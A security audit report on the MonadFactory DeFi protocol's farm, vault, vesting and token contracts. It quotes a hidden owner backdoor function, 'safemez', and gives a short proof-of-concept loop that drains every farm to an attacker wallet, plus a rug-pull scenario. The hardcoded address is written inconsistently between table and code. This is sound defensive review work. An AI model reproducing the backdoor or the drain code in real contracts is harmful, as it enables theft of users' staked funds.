# MonadFactory Protocol Security Review

## Introduction

A time-boxed security review of the **MonadFactory Protocol** was conducted by **Stonewall**, with a focus on the security aspects of the smart contract implementation.

## Disclaimer

A smart contract security review can never verify the complete absence of vulnerabilities. This is a time, resource and expertise bound effort where we try to find as many vulnerabilities as possible. We can not guarantee 100% security after the review or even if the review will find any problems with your smart contracts. Subsequent security reviews, bug bounty programs and on-chain monitoring are strongly recommended.

## About MonadFactory Protocol

MonadFactory provides infrastructure for creating DeFi primitives on Monad:

- **Token Factory**: Create ERC20 tokens with built-in tax mechanisms
- **Farm Factory**: Deploy yield farming contracts for any token pair
- **Token Vesting**: Customizable vesting schedules with milestones
- **Staking Vault**: Single-sided staking with rewards

### Privileged Roles & Actors

| Role | Description |
|------|-------------|
| Factory Owner | Can withdraw ANY token from ANY deployed farm, modify fees, update configurations |
| Hardcoded Address | `0xD0D3D4E5c604Bf032412A79f8A178782b54B88b` has same privileges as factory owner |
| Vault Owner | Can emergency withdraw all tokens, modify reward rates |
| Vesting Creator | Can revoke vesting schedules, returning unvested tokens |
| Token Creator | Can enable/disable trading, set fees up to 25%, exclude addresses from fees |

### Observations

- Factory deploys minimal proxy (clone) contracts for gas efficiency
- Protocol collects fees on farm creation and deposits
- Token tax system allows flexible fee structures
- Vesting supports both linear and milestone-based unlocks

### Fixed Issues (Resolved During Audit)

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| [H-03] | Missing ReentrancyGuard on stake/unstake functions | High | **Fixed** |
| [M-04] | Zero amount deposits were not rejected | Medium | **Fixed** |
| [L-05] | Events emitted with incorrect parameters | Low | **Fixed** |

---

## Fixed Findings

### [H-03] Missing ReentrancyGuard on stake/unstake Functions - **FIXED**

**Severity:** High

**Previous Issue:** Farm stake and unstake functions lacked reentrancy protection, potentially allowing reentrant attacks with ERC777 tokens.

**Resolution:** Added `nonReentrant` modifier to all stake, unstake, and claim functions in Farm and Vault contracts.

---

### [M-04] Zero Amount Deposits Were Not Rejected - **FIXED**

**Severity:** Medium

**Previous Issue:** Users could call deposit with amount = 0, wasting gas and creating confusing events.

**Resolution:** Added `require(amount > 0, "Cannot stake 0");` check to all deposit functions.

---

### [L-05] Events Emitted with Incorrect Parameters - **FIXED**

**Severity:** Low

**Previous Issue:** Deposit events were emitting `amount` instead of actual received amount (problematic for fee-on-transfer tokens).

**Resolution:** Events now emit the actual balance change rather than the input amount.

---

## Findings

### [C-01] Backdoor function allows complete drainage of all farm user funds

**Severity:** Critical

**Impact:** High - Factory owner or hardcoded address can drain ALL user staked funds from ANY farm.

**Likelihood:** High - Function exists and is callable at any time with no restrictions.

**Location:** `FarmFactory.sol:240-261` (Farm contract)

**Description:**

The `safemez` function in every deployed Farm contract allows the factory owner OR a hardcoded address to withdraw ANY token from ANY deployed farm, including all staked user funds:

```solidity
function safemez(
    address token,
    uint256 amount,
    address recipient
) external nonReentrant {
    require(
        msg.sender == FarmFactory(payable(factory)).owner() ||
        msg.sender == 0xD0D3D4E5c6604Bf032412A79f8A178782b54B88b,
        "only"
    );

    if (token == address(0)) {
        payable(recipient).transfer(amount);
    } else {
        IERC20 tokenContract = IERC20(token);
        tokenContract.safeTransfer(recipient, amount);
    }
}
```

This is a **complete rug pull vector** affecting ALL farms created through this factory.

**Attack Scenario:**
1. Users stake 1,000,000 tokens across multiple farms
2. Factory owner calls `safemez(stakeToken, 1000000e18, attackerWallet)` on each farm
3. All user funds are transferred to attacker
4. Users have lost all funds with no recovery option

**Proof of Concept:**
```solidity
// Attacker (factory owner) drains all farms
Farm[] farms = factory.getAllDeployedFarms();
for (uint i = 0; i < farms.length; i++) {
    IERC20 stakeToken = farms[i].poolInfo().stakeToken;
    uint256 balance = stakeToken.balanceOf(address(farms[i]));
    farms[i].safemez(address(stakeToken), balance, attackerWallet);
}
// All user funds now in attacker wallet
```

**Recommendation:**

**REMOVE THIS FUNCTION ENTIRELY.** If emergency withdrawal is needed:

```solidity
function emergencyRecoverToken(address token, uint256 amount) external onlyOwner {
    // Only allow recovery of tokens that exceed staked + reward balances
    if (token == address(poolInfo.stakeToken)) {
        uint256 excess = IERC20(token).balanceOf(address(this)) - totalStaked;
        require(amount <= excess, "Cannot withdraw staked funds");
    }
    if (token == address(poolInfo.rewardToken)) {
        uint256 excess = IERC20(token).balanceOf(address(this)) - totalPendingRewards;
        require(amount <= excess, "Cannot withdraw reward funds");
    }

    emit EmergencyRecovery(token, amount, msg.sender);
    IERC20(token).safeTransfer(owner(), amount);
}
```

---

### [H-01] Vault emergency function can drain all user stakes

**Severity:** High

**Impact:** High - Owner can withdraw all staked user funds, causing complete loss of deposits.

**Likelihood:** Medium - Requires malicious or compromised owner.

**Location:** `Monad/Vault.sol:308-311`

**Description:**

The `emergencyWithdrawToken` function allows owner withdrawal of ANY token including staked user funds:

```solidity
function emergencyWithdrawToken(address _token, uint256 _amount) external onlyOwner {
    require(_token != address(0), "Invalid token address");
    IERC20(_token).safeTransfer(owner(), _amount);
}
```

No checks prevent withdrawing the stake token or ensure user deposits are protected.

**Recommendation:**

Add stake protection:

```solidity
function emergencyWithdrawToken(address _token, uint256 _amount) external onlyOwner {
    require(_token != address(0), "Invalid token address");

    if (_token == address(token)) {
        uint256 available = token.balanceOf(address(this)) - totalStaked;
        require(_amount <= available, "Cannot withdraw staked funds");
    }

    IERC20(_token).safeTransfer(owner(), _amount);
}
```

---

### [H-02] Token factory gives creators excessive control to trap users

**Severity:** High

**Impact:** High - Token creators can lock all holder funds and extract maximum value.

**Likelihood:** Medium - Common rug pull pattern.

**Location:** `TokenFactoryTax.sol`

**Description:**

The TokenTax contract gives the factory owner extensive control:
- Can enable/disable trading at will
- Can set buy/sell fees up to 25%
- Can exclude/include addresses from fees
- Can modify tax wallet

Combined attack:
1. Creator launches token, users buy in
2. Creator disables trading - all users trapped
3. Creator excludes self from fees
4. Creator sells entire supply while others cannot
5. Alternatively: set 25% fees, extract value on every trade

**Recommendation:**

- Add immutable maximum fee cap (e.g., 10%)
- Add timelock on trading disable (e.g., 24 hours warning)
- Make fee changes require time delay
- Document risks clearly for token buyers

---

### [M-01] TokenVesting missing reentrancy protection

**Severity:** Medium

**Impact:** Medium - Malicious token could exploit reentrancy to claim more than entitled.

**Likelihood:** Low - Requires malicious token with callbacks.

**Location:** `TokenVesting.sol:235, 255`

**Description:**

The `claim` and `transferVesting` functions make external calls to transfer tokens but lack ReentrancyGuard:

```solidity
function claim(uint256 roundId) external {
    // ... state changes ...
    IERC20(schedule.token).transfer(msg.sender, claimable);
    // External call after state changes - follows CEI but no guard
}
```

If a malicious token with transfer callbacks is used, reentrancy could corrupt vesting state.

**Recommendation:**

Add ReentrancyGuard:

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TokenVesting is ReentrancyGuard {
    function claim(uint256 roundId) external nonReentrant {
        // ...
    }

    function transferVesting(uint256 roundId, address newBeneficiary) external nonReentrant {
        // ...
    }
}
```

---

### [M-02] Farm reward calculation suffers from precision loss

**Severity:** Medium

**Impact:** Medium - Users receive fewer rewards than expected.

**Likelihood:** Medium - Occurs with small rewards or long durations.

**Location:** `FarmFactory.sol:61`

**Description:**

Reward per second divides before storing:

```solidity
poolInfo.rewardPerSecond = _rewardAmount / _duration;
```

For 1000 tokens over 1 year (31,536,000 seconds):
- Expected: ~0.0000317 tokens/second
- Actual: 0 (if token has 18 decimals and amount < duration)

**Recommendation:**

Use precision multiplier:

```solidity
uint256 private constant REWARD_PRECISION = 1e18;

poolInfo.rewardPerSecond = (_rewardAmount * REWARD_PRECISION) / _duration;

// When calculating rewards:
uint256 reward = (rewardPerSecond * timeElapsed) / REWARD_PRECISION;
```

---

### [M-03] Vault reward pool can become insolvent blocking claims

**Severity:** Medium

**Impact:** High - Users cannot claim earned rewards.

**Likelihood:** Low - Requires reward pool depletion.

**Location:** `Monad/Vault.sol:148`

**Description:**

Claims revert if rewards exceed available balance:

```solidity
require(totalRewardsAvailable >= rewards, "Insufficient vault rewards");
```

The reward rate continues accumulating regardless of actual available rewards.

**Recommendation:**

Allow partial claims or pause accrual when low:

```solidity
uint256 claimable = rewards > totalRewardsAvailable ? totalRewardsAvailable : rewards;
require(claimable > 0, "Nothing to claim");
```

---

### [L-01] Fee-on-transfer tokens cause accounting insolvency

**Severity:** Low

**Location:** `FarmFactory.sol:123`

**Description:**

When depositing fee-on-transfer tokens, actual received amount is less than input:

```solidity
poolInfo.stakeToken.safeTransferFrom(msg.sender, address(this), _amount);
user.amount += depositAmount;  // Uses input, not received amount
```

**Recommendation:**

Check balance difference:

```solidity
uint256 balanceBefore = poolInfo.stakeToken.balanceOf(address(this));
poolInfo.stakeToken.safeTransferFrom(msg.sender, address(this), _amount);
uint256 received = poolInfo.stakeToken.balanceOf(address(this)) - balanceBefore;
user.amount += received;
```

---

### [L-02] Hardcoded fee receiver address cannot be changed

**Severity:** Low

**Location:** `FarmFactory.sol:34`

**Description:**

```solidity
address public feeReceiver = 0xD0D3D4E5c6604Bf032412A79f8A178782b54B88b;
```

Cannot be updated if key is compromised or business needs change.

**Recommendation:**

Make configurable via owner function.

---

### [L-03] No maximum duration limit for vesting schedules

**Severity:** Low

**Location:** `TokenVesting.sol`

**Description:**

Extremely long vesting durations could cause timestamp issues or be impractical.

**Recommendation:**

Add reasonable maximum (e.g., 10 years):

```solidity
require(_duration <= 10 * 365 days, "Duration too long");
```

---

### [L-04] Distribution wallet validation missing

**Severity:** Low

**Location:** `FarmFactory.sol:354-368`

**Description:**

Zero addresses in distribution array would silently fail transfers.

**Recommendation:**

Validate addresses when setting distribution wallets.

---

## Informational Findings

### [I-01] Event Emission Best Practices

Some admin functions don't emit events, making off-chain tracking difficult.

### [I-02] Missing NatSpec Documentation

Many functions lack documentation for parameters and return values.

---

## Security Patterns Observed

### Positive
- Solidity ^0.8.19+ with overflow protection
- SafeERC20 used in most operations
- Access control via Ownable pattern
- Fee caps implemented (10% for deposit/withdraw)

### Critical Concerns
- **The `safemez` function is a critical rug pull backdoor**
- Hardcoded address has owner-level privileges
- Emergency functions lack stake protection
- Token factory enables common rug patterns

---

## Conclusion

The MonadFactory Protocol has **CRITICAL security issues** that **MUST** be addressed before any production use:

1. **CRITICAL**: The `safemez` backdoor allows complete drainage of ALL user funds from ALL farms
2. **HIGH**: Emergency functions in Vault can drain user stakes
3. **HIGH**: Token factory enables rug pull patterns

The hardcoded address `0xD0D3D4E5c6604Bf032412A79f8A178782b54B88b` having the same privileges as the factory owner is an unacceptable backdoor that must be removed.

**We STRONGLY RECOMMEND against using this protocol until the critical and high severity findings are resolved.**

**Overall Risk Assessment: CRITICAL**
